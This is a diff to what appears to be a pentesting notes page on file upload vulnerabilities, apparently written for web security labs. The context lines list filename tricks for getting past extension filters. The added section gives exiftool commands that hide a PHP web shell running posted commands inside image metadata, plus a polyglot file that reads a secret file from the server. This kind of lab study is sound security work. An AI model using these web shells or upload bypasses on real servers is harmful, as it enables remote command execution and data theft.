@@ -27,3 +27,19 @@ In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and fi
 * Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
 * Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
 * Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
+
+#### Flawed validation of the file's contents <a href="#flawed-validation-of-the-file-s-contents" id="flawed-validation-of-the-file-s-contents"></a>
+
+Modify the metadata of the image to insert code
+
+{% code overflow="wrap" %}
+```
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" 3.jpg
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+```
+{% endcode %}
